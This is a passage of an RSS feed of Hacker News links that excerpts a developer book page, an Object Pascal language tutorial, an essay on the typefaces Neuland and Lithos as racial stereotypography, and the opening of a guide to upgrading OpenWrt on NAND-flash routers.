<ul><li><a href="https://www.indiebound.org/book/9781484260739">Indiebound</a></li><li><a href="https://bookshop.org/books/letters-to-a-new-developer-what-i-wish-i-had-known-when-starting-my-development-career/9781484260739">Bookshop</a></li><li><a href="https://www.amazon.com/Letters-New-Developer-Starting-Development/dp/1484260732/">Amazon</a></li><li><a href="https://www.barnesandnoble.com/w/letters-to-a-new-developer-dan-moore/1137054764">Barnes and Noble</a></li><li><a href="https://www.apress.com/us/book/9781484260739">Apress US website</a> (where you can buy the PDF) </li><li><a href="https://www.apress.com/gp/book/9781484260739">Apress European website</a></li></ul>



<p>Here’s the provisional table of contents:</p>



<ol><li>Introduction (they wouldn’t let me call it Chapter 0, even though developers start there)</li><li>Your first month</li><li>Questions</li><li>Writing</li><li>Tools</li><li>Practices</li><li>The Business</li><li> Learning</li><li>Mistakes</li><li>Career</li><li>Community</li></ol>



<p>If you’d rather be reminded when it is launches, please <a href="https://letterstoanewdeveloper.com/contact/">contact me and let me know</a>. You’ll also get a PDF of a sample letter.</p>
	</div><!-- .entry-content -->

	</article><!-- #post-## -->

				
			
		</main><!-- #main -->
	</div><!-- #primary -->

<!-- #secondary -->

		</div><!-- #content -->

		<!-- #colophon -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/the-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23743072</guid>
            <pubDate>Sun, 05 Jul 2020 23:24:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern Object Pascal Introduction for Programmers]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 36 (<a href="https://news.ycombinator.com/item?id=23742999">thread link</a>) | @eatonphil
<br/>
July 5, 2020 | http://newpascal.org/assets/modern_pascal_introduction.html | <a href="https://web.archive.org/web/*/http://newpascal.org/assets/modern_pascal_introduction.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<div>
<h2 id="_why">1. Why</h2>
<div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
This is a modified version of the original document from Michalis, because we (authors of <a href="http://newpascal.org/">http://newpascal.org/</a> and <a href="http://synopse.info/">http://synopse.info/</a> ) prefer the "mode delphi" without the "generic" / "specialize" keywords.
</td>
</tr>
</tbody></table>
</div>
<p>There are many books and resources about Pascal out there, but too many of them talk about the old Pascal, without classes, units or generics.</p>
<p>So I wrote this quick introduction to what I call <strong>modern Object Pascal</strong>. Most of the programmers using it don’t really call it <em>"modern Object Pascal"</em>, we just call it  <em>"our Pascal"</em>. But when introducing the language, I feel it’s important to emphasize that it’s a modern, object-oriented language. It evolved a <strong>lot</strong> since the old (Turbo) Pascal that many people learned in schools long time ago. Feature-wise, it’s quite similar to C++ or Java or C#.</p>
<div>
<ul>
<li>
<p>It has all the modern features you expect — classes, units, interfaces, generics…​</p>
</li>
<li>
<p>It’s compiled to a fast, native code,</p>
</li>
<li>
<p>It’s very type safe,</p>
</li>
<li>
<p>High-level but can also be low-level if you need it to be.</p>
</li>
</ul>
</div>
<p>It also has excellent, portable and open-source compiler called the <em>Free Pascal Compiler</em>, <a href="http://freepascal.org/">http://freepascal.org/</a> . And an accompanying IDE (editor, debugger, a library of visual components, form designer) called <em>Lazarus</em> <a href="http://lazarus.freepascal.org/">http://lazarus.freepascal.org/</a> . Myself, I’m the creator of <em>Castle Game Engine</em>, <a href="https://castle-engine.io/">https://castle-engine.io/</a> , which is a cool portable 3D and 2D game engine using this language to create games on many platforms (Windows, Linux, MacOSX, Android, iOS, web plugin).</p>
<p>This introduction is mostly directed at programmers who already have experience in other languages. We will not cover here the meanings of some universal concepts, like <em>"what is a class"</em>, we’ll only show how to do them in Pascal.</p>
</div>
</div>
<div>
<h2 id="_basics">2. Basics</h2>
<div>
<div>
<h3 id="__hello_world_program">2.1. "Hello world" program</h3>
<div>
<div>
<pre><code data-lang="pascal"><span>{$mode delphi}</span> 

<span>program</span> MyProgram; 
<span>begin</span>
  Writeln(<span><span>'</span><span>Hello world!</span><span>'</span></span>);
<span>end</span>.</code></pre>
</div>
</div>
<p>This is a complete program that you can <em>compile</em> and <em>run</em>.</p>
<div>
<ul>
<li>
<p>If you use the command-line FPC, just create a new file <code>myprogram.lpr</code> and execute <code>fpc myprogram.lpr</code>.</p>
</li>
<li>
<p>If you use <em>Lazarus</em>, create a new project (menu <em>Project</em> → <em>New Project</em> → <em>Simple Program</em>). Save it as <code>myprogram</code> and paste this source code as the main file. Compile using the menu item <em>Run → Compile</em>.</p>
</li>
<li>
<p>This is a command-line program, so in either case — just run the compiled executable from the command-line.</p>
</li>
</ul>
</div>
<p>The rest of this article talks about the Object Pascal language, so don’t expect to see anything more fancy than the command-line stuff. If you want to see something cool, just create a new GUI project in <em>Lazarus</em> (<em>Project</em> → <em>New Project</em> → <em>Application</em>).
Voila — a working GUI application, cross-platform, with native look everywhere, using a comfortable visual component library. The <em>Lazarus</em> and <em>Free Pascal Compiler</em> come with lots of ready units for networking, GUI, database, file formats (XML, json, images…​), threading and everything else you may need. I already mentioned my cool <em>Castle Game Engine</em> earlier:)</p>
</div>
<div>
<h3 id="_functions_procedures_primitive_types">2.2. Functions, procedures, primitive types</h3>
<div>
<div>
<pre><code data-lang="pascal"><span>{$mode delphi}</span>

<span>program</span> MyProgram;

<span>procedure</span> MyProcedure(<span>const</span> A: Integer);
<span>begin</span>
  Writeln(<span><span>'</span><span>A + 10 is: </span><span>'</span></span>, A + <span>10</span>);
<span>end</span>;

<span>function</span> MyFunction(<span>const</span> S: <span>string</span>): <span>string</span>;
<span>begin</span>
  Result := S + <span><span>'</span><span>strings are automatically managed</span><span>'</span></span>;
<span>end</span>;

<span>var</span>
  X: Single;
<span>begin</span>
  Writeln(MyFunction(<span><span>'</span><span>Note: </span><span>'</span></span>));
  MyProcedure(<span>5</span>);

  
  X := <span>15</span> / <span>5</span>;
  Writeln(<span><span>'</span><span>X is now: </span><span>'</span></span>, X); 
  Writeln(<span><span>'</span><span>X is now: </span><span>'</span></span>, X:<span>1</span>:<span>2</span>); 
<span>end</span>.</code></pre>
</div>
</div>
<p>To return a value from a function, assign something to the magic <code>Result</code> variable. You can read and set the <code>Result</code> freely, just like a local variable.</p>
<div>
<div>
<pre><code data-lang="pascal"><span>function</span> MyFunction(<span>const</span> S: <span>string</span>): <span>string</span>;
<span>begin</span>
  Result := S + <span><span>'</span><span>something</span><span>'</span></span>;
  Result := Result + <span><span>'</span><span> something more!</span><span>'</span></span>;
  Result := Result + <span><span>'</span><span> and more!</span><span>'</span></span>;
<span>end</span>;</code></pre>
</div>
</div>
<p>You can also treat the function name (like <code>MyFunction</code> in example above) as the variable, to which you can assign. But I would discourage it in new code, as it looks "fishy" when used on the right side of the assignment expression. Just use <code>Result</code> always when you want to read or set the function result.</p>
<p>If you want to call the function itself recursively, you can of course do it. If you’re calling a parameter-less function recursively, be sure to specify the parenthesis (even though in Pascal you can usually omit the parentheses for a parameter-less function), this makes a recursive call to a parameter-less function different from accessing this function’s current result. Like this:</p>
<div>
<div>
<pre><code data-lang="pascal"><span>function</span> ReadIntegersUntilZero: <span>string</span>;
<span>var</span>
  I: Integer;
<span>begin</span>
  Readln(I);
  Result := IntToStr(I);
  <span>if</span> I &lt;&gt; <span>0</span> <span>then</span>
    Result := Result + <span><span>'</span><span> </span><span>'</span></span> + ReadIntegersUntilZero();
<span>end</span>;</code></pre>
</div>
</div>
<p>You can call <code>Exit</code> to end the execution of the procedure or function before it reaches the final <code>end;</code>. If you call parameter-less <code>Exit</code> in a function, it will return the last thing you set as <code>Result</code>. You can also use <code>Exit(X)</code> construct, to set the function result and exit <strong>now</strong> — this is just like <code>return X</code> construct in C-like languages.</p>
<div>
<div>
<pre><code data-lang="pascal"><span>function</span> AddName(<span>const</span> ExistingNames, NewName: <span>string</span>): <span>string</span>;
<span>begin</span>
  <span>if</span> ExistingNames = <span><span>'</span><span>'</span></span> <span>then</span>
    Exit(NewName);
  Result := ExistingNames + <span><span>'</span><span>, </span><span>'</span></span> + NewName;
<span>end</span>;</code></pre>
</div>
</div>
</div>
<div>
<h3 id="_testing_if">2.3. Testing (if)</h3>
<p>Use <code>if .. then</code> or <code>if .. then .. else</code> to run some code when some condition is satisfied. Unlike in the C-like languages, in Pascal you don’t have to wrap the condition in parenthesis.</p>
<div>
<div>
<pre><code data-lang="pascal"><span>var</span>
  A: Integer;
  B: boolean;
<span>begin</span>
  <span>if</span> A &gt; <span>0</span> <span>then</span>
    DoSomething;

  <span>if</span> A &gt; <span>0</span> <span>then</span>
  <span>begin</span>
    DoSomething;
    AndDoSomethingMore;
  <span>end</span>;

  <span>if</span> A &gt; <span>10</span> <span>then</span>
    DoSomething
  <span>else</span>
    DoSomethingElse;

  
  B := A &gt; <span>10</span>;
  <span>if</span> B <span>then</span>
    DoSomething
  <span>else</span>
    DoSomethingElse;
<span>end</span>;</code></pre>
</div>
</div>
<p>The <code>else</code> is paired with the last <code>if</code>. So this works as you expect:</p>
<div>
<div>
<pre><code data-lang="pascal"><span>if</span> A &lt;&gt; <span>0</span> <span>then</span>
  <span>if</span> B &lt;&gt; <span>0</span> <span>then</span>
    AIsNonzeroAndBToo
  <span>else</span>
    AIsNonzeroButBIsZero;</code></pre>
</div>
</div>
<p>While the example with nested <code>if</code> above is correct, it is often better to place the nested <code>if</code> inside a <code>begin</code> …​ <code>end</code> block in such cases. This makes the code more obvious to the reader, and it will remain obvious even if you mess up the indentation. The improved version of the example is below. When you add or remove some <code>else</code> clause in the code below, it’s obvious to which condition it will apply (to the <code>A</code> test or the <code>B</code> test), so it’s less error-prone.</p>
<div>
<div>
<pre><code data-lang="pascal"><span>if</span> A &lt;&gt; <span>0</span> <span>then</span>
<span>begin</span>
  <span>if</span> B &lt;&gt; <span>0</span> <span>then</span>
    AIsNonzeroAndBToo
  <span>else</span>
    AIsNonzeroButBIsZero;
<span>end</span>;</code></pre>
</div>
</div>
</div>
<div>
<h3 id="_logical_relational_and_bit_wise_operators">2.4. Logical, relational and bit-wise operators</h3>
<p>The <em>logical operators</em> are called <code>and</code>, <code>or</code>, <code>not</code>, <code>xor</code>. Their meaning is probably obvious (search for <em>"exclusive or"</em> if you’re unsure what <em>xor</em> does:). They take <em>boolean arguments</em>, and return a <em>boolean</em>. They can also act as <em>bit-wise operators</em> when both arguments are integer values, in which case they return an integer.</p>
<p>The <em>relational (comparison)</em> operators are <code>=</code>, <code>&lt;&gt;</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>. If you’re accustomed to C-like languages, note that in Pascal you compare two values (check are they equal) using a single equality character <code>A = B</code> (unlike in C where you use <code>A == B</code>). The special <em>assignment</em> operator in Pascal is <code>:=</code>.</p>
<p>The <em>logical (or bit-wise) operators have a higher precedence than relational operators</em>. So you may need to use parenthesis around some expressions.</p>
<p>For example this is a compilation error:</p>
<div>
<div>
<pre><code data-lang="pascal"><span>var</span>
  A, B: Integer;
<span>begin</span>
  <span>if</span> A = <span>0</span> <span>and</span> B &lt;&gt; <span>0</span> <span>then</span> ... </code></pre>
</div>
</div>
<p>The above fails to compile, because the compiler sees the bit-wise <code>and</code> inside: <code>(0 and B)</code>.</p>
<p>This is correct:</p>
<div>
<div>
<pre><code data-lang="pascal"><span>var</span>
  A, B: Integer;
<span>begin</span>
  <span>if</span> (A = <span>0</span>) <span>and</span> (B &lt;&gt; <span>0</span>) <span>then</span> ...</code></pre>
</div>
</div>
<p>The <em>short-circuit evaluation</em> is used. Consider this expression:</p>
<div>
<div>
<pre><code data-lang="pascal"><span>if</span> MyFunction(X) <span>and</span> MyOtherFunction(Y) <span>then</span>...</code></pre>
</div>
</div>
<div>
<ul>
<li>
<p>It’s guaranteed that <code>MyFunction(X)</code> will be evaluated first.</p>
</li>
<li>
<p>And if <code>MyFunction(X)</code> returns <code>false</code>, then the value of expression is known (the value of <code>false and whatever</code> is always <code>false</code>), and <code>MyOtherFunction(Y)</code> will not be executed at all.</p>
</li>
<li>
<p>Analogous rule is for <code>or</code> expression. There, if the expression is known to be <code>true</code> (because the 1st operand is <code>true</code>), the 2nd operand is not evaluated.</p>
</li>
<li>
<p>This is particularly useful when writing expressions like</p>
<div>
<div>
<pre><code data-lang="pascal"><span>if</span> (A &lt;&gt; <span>nil</span>) <span>and</span> A.IsValid <span>then</span>...</code></pre>
</div>
</div>
<p>This will work OK, even when <code>A</code> is <code>nil</code>.</p>
</li>
</ul>
</div>
</div>
<div>
<h3 id="_testing_single_expression_for_multiple_values_case">2.5. Testing single expression for multiple values (case)</h3>
<p>If a different action should be executed depending on the value of some expression, then the <code>case .. of .. end</code> statement is useful.</p>
<div>
<div>
<pre><code data-lang="pascal"><span>case</span> SomeValue <span>of</span>
  <span>0</span>: DoSomething;
  <span>1</span>: DoSomethingElse;
  <span>2</span>: <span>begin</span>
       IfItsTwoThenDoThis;
       AndAlsoDoThis;
     <span>end</span>;
  <span>3</span>..<span>10</span>: DoSomethingInCaseItsInThisRange;
  <span>11</span>, <span>21</span>, <span>31</span>: AndDoSomethingForTheseSpecialValues;
  <span>else</span> DoSomethingInCaseOfUnexpectedValue;
<span>end</span>;</code></pre>
</div>
</div>
<p>The <code>else</code> clause is optional. When no condition matches, and there’s no <code>else</code>, then nothing happens.</p>
<p>In you come from C-like languages, and compare this with <code>switch</code> statement in these languages, you will notice that there is no automatic <em>fall-through</em>. This is a deliberate blessing in Pascal. You don’t have to remember to place <code>break</code> instructions. In every execution, <em>at most one</em> branch of the <code>case</code> is executed, that’s it.</p>
</div>
<div>
<h3 id="_enumerated_and_ordinal_types_and_sets_and_constant_length_arrays">2.6. Enumerated and ordinal types and sets and constant-length arrays</h3>
<p>Enumerated type in Pascal is a very nice, opaque type. You will probably use it much more often than enums in other languages:)</p>
<div>
<div>
<pre><code data-lang="pascal"><span>type</span>
  TAnimalKind = (akDuck, akCat, akDog);</code></pre>
</div>
</div>
<p>The convention is to prefix the enum names with a two-letter shortcut of type name, hence <code>ak</code> = shortcut for <em>"Animal Kind"</em>. This is a useful convention, since the enum names are in the unit (global) namespace. So by prefixing them with <code>ak</code> prefix, you minimize the chances of collisions with other identifiers.</p>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
The collisions in names are not a show-stopper. It’s Ok for different units to define the same identifier. But it’s a good idea to try to avoid the collisions anyway, to keep code simple to understand and grep.
</td>
</tr>
</tbody></table>
</div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
You can avoid placing enum names in the global namespace by directive <code>{$scopedenums on}</code>. This means you will have to access them qualified by a type name, like <code>TAnimalKind.akDuck</code>. The need for <code>ak</code> prefix disappears in this situation, and you will probably just call the enums <code>Duck, Cat, Dog</code>. This is …</td></tr></tbody></table></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://newpascal.org/assets/modern_pascal_introduction.html">http://newpascal.org/assets/modern_pascal_introduction.html</a></em></p>]]>
            </description>
            <link>http://newpascal.org/assets/modern_pascal_introduction.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742999</guid>
            <pubDate>Sun, 05 Jul 2020 23:15:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New Black Face: Neuland and Lithos as Stereotypography (2004)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23742978">thread link</a>) | @cardamomo
<br/>
July 5, 2020 | https://linedandunlined.com/archive/new-black-face/ | <a href="https://web.archive.org/web/*/https://linedandunlined.com/archive/new-black-face/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<header>
			
		</header>

		<blockquote>
  <p>“The Neuland Question comes up regularly, and alas without much resolution….” –Jonathan Hoefler</p>
</blockquote>

<p>The “Neuland Question” to which Jonathan Hoefler refers involves not just Neuland, a “display” typeface hand-carved in 1923 by Rudolf Koch (<a href="#p1">Plate 1</a>), but also Lithos, another “display” typeface digitally created in 1989 by Carol Twombly (<a href="#p2">Plate 2</a>). The Question can be put simply: How did these two typefaces come to signify Africans and African-Americans, regardless of how a designer uses them, and regardless of the purpose for which their creators originally intended them? The investigation of this question has four parts: first, an examination of the environments in which Koch and Twombly created the original typefaces; second, an examination of the graphic culture that surrounded African-Americans prior to the creation of Neuland through a close viewing of tobacco ephemera; third, an examination of the Art Deco (French Modern) style, the graphic culture most prevalent in the United States at the time of Neuland’s release; and finally, an examination of the ways designers use Neuland and Lithos today.</p>

<h2 id="plate-1"><a name="p1">Plate 1</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/01.jpg" alt="Neuland"></p>

<h2 id="plate-2"><a name="p2">Plate 2</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/02.jpg" alt="Lithos"></p>

<p>Rudolf Koch was born in 1876 and had a career that was both uninteresting and undistinguished until he enlisted in the German Army in 1907 to fight in World War I. Upon returning from the war, he commented to his close friend Siegfried Guggenheim that he was “profoundly stirred” by his experiences (10). The horrors of war inspired Koch to seek religion for himself and then preach the benefits of a religious life to his countrymen. Having experimented with the art of calligraphy shortly before enlisting, Koch returned to the art after WWI with the intention of making bold, noticeable typefaces that would shout to other Germans that following God’s path would help them find comfort from the trauma of war. Guggenheim notes, “Koch’s fonts after the war were designed for broadsides, postcards, etc. – not books [… they were designed] to demonstrate his religious fervency” (11–13). Neuland was such a face. Yale University Printer John Gambell suggests that Koch designed the face with the intent of making a modern version of the German black letter (or black face) style. Black letter fonts were used at the time for the setting of important texts, especially Bibles and church-related documents. Koch’s “new black face” attempted to preserve the flared, interlocking forms of the traditional black letter style, while at the same time adopting the sans-serif style around which modernists, like Paul Renner, were building their typefaces. Renner’s Futura, the quintessential example of modernist typography, was designed in 1927, only four years after the Klingspor Type Foundry released Koch’s Neuland (Rock).</p>

<p>Koch’s settings of Neuland in the original German specimen book published by the Klingspor Type Foundry support Gambell’s suggestion. He sets the type with minimal leading and kerning as black letter was typically set (<a href="#p345">Plate 3</a>). He inserts woodcuts and Greek cross-shaped (+) ampersands as well (<a href="#p345">Plate 4</a>), a common practice with black letter texts. However, Koch broke with black letter typesetting standards by stripping Neuland of the delicately interlocking serifs commonly used in black letter typography. The result, a font composed of heavy black forms, was visible from great distances and easily distinguishable from lighter-weight typefaces on a page. These qualities made Neuland suitable to advertising. Koch even attempted to set a classified ad in Neuland at the end of the German specimen book (<a href="#p345">Plate 5</a>).</p>

<h2 id="plates-3-4-and-5"><a name="p345">Plates 3, 4, and 5</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/03-04-05.jpg" alt="Koch lettering"></p>

<p>By the time Neuland reached the United States, its distributor, the Continental Typefounder’s Association, had little interest in Neuland’s uses as a modern black letter, and the specimen book that they prepared promoted Neuland as exclusively an advertising typeface, a “type that attracts attention” (Koch, Loose File, “Klingspor Type Foundry”). The American specimen book showed Neuland used in advertising settings from bank bonds to drywall contracting (<a href="#p6">Plate 6</a>). Because of the absence of a black letter tradition in the United States and because of the way the Continental Typefounder’s Association promoted Neuland, Koch’s intentions for the font were entirely lost immediately after its introduction in America.</p>

<h2 id="plate-6"><a name="p6">Plate 6</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/06.jpg" alt="Neuland specimen"></p>

<p>Just as Koch was trying to modernize an ancient form of writing with Neuland in 1923, so too was Carol Twombly with Lithos in 1989. Jonathan Hoefler suggests that “Lithos [is] an interpretation of ancient lapidary writing.” Twombly herself corroborates this:</p>

<blockquote>
  <p>Inscriptions honoring public figures or dedications for temples were intended for public viewing in ancient Greece. Geometric letterforms, free of adornment were chiseled into the stone. These basic shapes are the inspiration for Lithos.</p>
</blockquote>

<p>Letterforms like those that inspired Lithos can be seen not only on ancient Greek temples, but also on many modern buildings built in the Classical or Gothic styles, such as on the front entrance to Sterling Memorial Library at Yale University. In his famous book <em>The Elements of Typographic Style</em>, critic Robert Bringhurst notes that many modern typefaces take their inspiration from architectural sources, and, indeed, many of Twombly’s typefaces, like Lithos, come from ancient architecture: Trajan, a serifed face, evolved from carvings on columns in ancient Rome; and Charlemagne, another serifed face, evolved from carvings found in Byzantine temples.</p>

<p>Although Twombly left Trajan and Charlemagne relatively unaltered from their original forms, she made a substantial alteration in Lithos. Twombly decided to create a bold weight for Lithos in addition to its book weight, even though bold-weighted letterforms were nonexistent in ancient Greece. John Gambell suggests that Twombly “may have felt the font was not marketable today without a bold weight.” Regardless of her reasons, Lithos’ bold-weighted anachronism is now Neuland’s bastard child. Lithos’ flared edges, heavy lines, square characters, and pen-like strokes are analogous to Neuland’s trademark elements, and the fonts are virtually identical to the untrained eye. Indeed, Lithos’ close formal approximation to Neuland makes it virtually interchangeable with Neuland for designers working on African and African-American projects.</p>

<p>Because Lithos follows Neuland historically and formally, and because printers and designers used Neuland in African and African-American projects before Twombly even conceived Lithos, the resolution of the Neuland Question rests in reconstructing Neuland’s history.</p>

<p>Primarily because of both constant anti-African-American sentiment and the socioeconomic status of African-Americans during and after the Civil War, African-American graphic culture in the United States prior to Neuland’s release in 1923 and before the Harlem Renaissance in general was unimportant at best and nonexistent at worst. In short, African-Americans did not have the buying power or the social acceptance required to cultivate a significant graphic culture. What graphic culture they did have centered around their depiction in advertisements for products associated with slavery: tobacco and cotton.</p>

<p>Tremendous amounts of ephemera surrounded the tobacco industry from the 1850s until the 1930s, much of which involved racist uses of African-Americans as mascots. Much of this ephemera took the form of trading cards given out in general stores, on street corners, or wherever tobacco was sold (<a href="#p7">Plate 7</a>). These trading cards were common media for advertising from the 1850s to the 1930s, and generally involved a caricatured picture of a “Negro” and a slogan in dialect (“Sho’ fly, git away from dar”) on the front and information about the product on the back (<a href="#p8">Plate 8</a>). As tobacco companies had to make these cards cheaply and copiously, the text on the back of these cards was often poorly set with cheap woodblock type rather than with more expensive metal type.</p>

<p>While today woodblock type has a certain nostalgic appeal, designers and typophiles (typographic historians and typography enthusiasts) into the 1950s saw woodblock letters as nothing but lower-class. Immediately upon its release, designers and typophiles linked Neuland’s forms with woodblock type and responded accordingly. In his book <em>Typographic Milestones</em>, typophile Allan Haley charges “Neuland is not considered a particularly practical, useful, or attractive typeface” (70). He later reiterates his point, saying, “[Neuland is] not especially attractive, nor even very useful […] its realistic applications are quite limited” (73). Typophiles like Haley frequently omitted Neuland from typographic histories altogether, and Neuland soon became a member of the family of fonts that designers call “garbage type”: esoteric, inelegant, difficult to set, and destined, like tobacco ephemera, for the garbage. Neuland’s figurative status as “garbage type” became a literal truth when, as popular design legend has it, printers threw the face away after becoming frustrated with the extraordinary weight of the thick lead letters and the large amount of space the alphabet consumed in their often small print shops.</p>

<h2 id="plate-7"><a name="p7">Plate 7</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/07.jpg" alt="Trade cards"></p>

<h2 id="plate-8"><a name="p8">Plate 8</a></h2>

<p><img src="https://linedandunlined.com/images/neuland/08.jpg" alt="Trade cards"></p>

<p>Apart from being perceived as cheap “garbage,” woodblock type carried with it a legacy of cultural stereotype. Woodblock type was also known as “circus type” because of its frequent use in promoting circuses. An entire culture of “stereotypography” developed around these playful woodblock typefaces as certain “circus types” came to stand for stereotypical visual associations that Americans held about the cultures that the “circus types” were designed to represent. For example, circus promoters used the woodblock type Tokyo when promoting performers from the Orient (<a href="#p9">Plate 9</a>). Hometown, another “circus type,” is a near match for Neuland (<a href="#p10">Plate 10</a>), as is Othello, a heavy (black) sign-lettering typeface whose name alludes to the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linedandunlined.com/archive/new-black-face/">https://linedandunlined.com/archive/new-black-face/</a></em></p>]]>
            </description>
            <link>https://linedandunlined.com/archive/new-black-face/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742978</guid>
            <pubDate>Sun, 05 Jul 2020 23:13:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remotely upgrading OpenWrt 15.05 to 19.07 on NAND flash boards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23742942">thread link</a>) | @todsacerdoti
<br/>
July 5, 2020 | https://gir.st/blog/upgrading-openwrt.html | <a href="https://web.archive.org/web/*/https://gir.st/blog/upgrading-openwrt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><a href="https://gir.st/">Home</a> | <a href="https://gir.st/blog">Blog</a> | <a href="https://gir.st/blog/upgrading-openwrt.html"><b>Upgrading OpenWrt (guide)</b></a>



<p>This guide will explain how to remotely, i.e. without having physical access to the machine, upgrade an embedded device from OpenWrt 15.05 or lower to LEDE 17.01 or OpenWrt 18.06/19.07. This process is usually not possible on systems equipped with NAND flash storage due to the root file system having been switched from yaffs2 to UBIFS without an official migration path in newer releases.
</p><p>This guide was written for our migration of Mikrotik Routerboard 450G, but should be applicable to a wide range of devices and possibly even manufacturers. Apply your usual judgement for when to deviate from the instructions.

</p><h2>Overview</h2>
<p>On a high level, the upgrade will take place in three parts: First, we prepare a specialized image (kernel + minimal initramfs) that fits solely within the "kernel" partition (<code>/dev/mtdblock5</code> on a Routerboard 450G). Secondly, we will replace the currently installed kernel with our boot image and boot from it. Finally, we transfer the stock <code>sysupgrade.bin</code> and our backup <code>tar.gz</code> and flash it using the official method—sysupgrade(8).

</p><figure> <!-- draw.io is neat :) -->
<svg width="312px" height="81px" viewBox="-0.5 -0.5 312 81"><!--{{{-->
<ellipse cx="60" cy="40" rx="60" ry="40" fill="#ffffff" stroke="#000000"></ellipse>
<text x="59.5" y="36.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Prepare bespoke</text>
<text x="59.5" y="50.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">initramfs image</text>
<path d="M 120 40 L 173.63 40" fill="none" stroke="#000000" stroke-miterlimit="10"></path>
<path d="M 178.88 40 L 171.88 43.5 L 173.63 40 L 171.88 36.5 Z" fill="#000000" stroke="#000000" stroke-miterlimit="10"></path>

<ellipse cx="240" cy="40" rx="60" ry="40" fill="#ffffff" stroke="#000000"></ellipse>
<text x="239.5" y="36.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Replace kernel and</text>
<text x="239.5" y="50.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">boot custom image</text>
<path d="M 300 40 L 353.63 40" fill="none" stroke="#000000" stroke-miterlimit="10"></path>
<path d="M 358.88 40 L 351.88 43.5 L 353.63 40 L 351.88 36.5 Z" fill="#000000" stroke="#000000" stroke-miterlimit="10"></path>


</svg><!--}}}--><svg width="312px" height="81px" viewBox="311 -0.5 312 81"><!--{{{-->
<path d="M 300 40 L 353.63 40" fill="none" stroke="#000000" stroke-miterlimit="10"></path>
<path d="M 358.88 40 L 351.88 43.5 L 353.63 40 L 351.88 36.5 Z" fill="#000000" stroke="#000000" stroke-miterlimit="10"></path>


<ellipse cx="420" cy="40" rx="60" ry="40" fill="#ffffff" stroke="#000000"></ellipse>
<text x="419.5" y="36.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">Transfer and flash</text>
<text x="419.5" y="50.5" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">stock OpenWrt</text>
<path d="M 480 40 L 533.63 40" fill="none" stroke="#000000" stroke-miterlimit="10"></path>
<path d="M 538.88 40 L 531.88 43.5 L 533.63 40 L 531.88 36.5 Z" fill="#000000" stroke="#000000" stroke-miterlimit="10"></path>

<ellipse cx="581" cy="40" rx="41" ry="40" fill="#ffffff" stroke="#000000"></ellipse>
<path d="M 549.2 44.08 C 549.2 56.25 563.44 66.12 581 66.12 C 598.56 66.12 612.8 56.25 612.8 44.08" fill="none" stroke="#000000" stroke-width="1.63" stroke-miterlimit="10"></path>
<path d="M 553.39 41.63 L 545.02 46.53" fill="#ffffff" stroke="#000000" stroke-miterlimit="10"></path>
<path d="M 608.61 41.63 L 616.98 46.53" fill="#ffffff" stroke="#000000" stroke-miterlimit="10"></path>
<ellipse cx="562.59" cy="28.57" rx="2.5102040816326534" ry="6.530612244897959" fill="#ffffff" stroke="#000000" stroke-width="4.9"></ellipse>
<ellipse cx="599.41" cy="28.57" rx="2.5102040816326534" ry="6.530612244897959" fill="#ffffff" stroke="#000000" stroke-width="4.9"></ellipse>
</svg><!--}}}-->
<figcaption>High level strategy</figcaption>
</figure>
<p>In the following steps, I will start with a bulleted list of the tasks, then explain them in detail.

</p><h2>Step 0: Backing up and checking compatibility</h2>
<ul>
<li>Prepare a backup with <kbd>sysupgrade -b /tmp/config.tar.gz</kbd>
</li><li>Verify the target device uses SLC NAND with <kbd>dmesg | grep nand</kbd>
</li></ul>
<p>If you intend to keep your current configuration, you should follow the <a href="https://openwrt.org/docs/guide-user/installation/generic.sysupgrade#preparing_for_an_openwrt_upgrade">Preparing To Upgrade</a> section from the OpenWrt documentation. <kbd>sysupgrade -b /tmp/config.tar.gz</kbd> should get you close. Keep in mind that OpenWrt has been overhauled dramatically, and changes to your configuration will probably be necessary.
</p><p>But before we can initiate the upgrade, we need to make sure your NAND flash is compatible with UBIFS. For a <a href="https://lists.openwrt.org/pipermail/openwrt-devel/2018-October/014454.html">short period of time in 2010</a>, Mikrotik installed cheaper and less reliable <abbr title="multi level cell">MLC</abbr> flash chips instead of the more reliable <abbr title="single level cell">SLC</abbr> ones. UBIFS predates MLC flash and will destroy it even when just reading from it due to a lack of an error correction daemon to fix the constantly occurring bitflips; the kernel will refuse to operate on such chips.
<br>To find out if you are affected, issue <kbd>dmesg | grep nand</kbd>. This command will return information about the chip on your device, including the type of NAND technology used (SLC or MLC). Flash storage from Samsung, Winbond, Numonyx or Micron is supposedly safe, while Hynix requires a closer look. Sadly, there is nothing you can do but to decommission the device if it has an MLC flash.
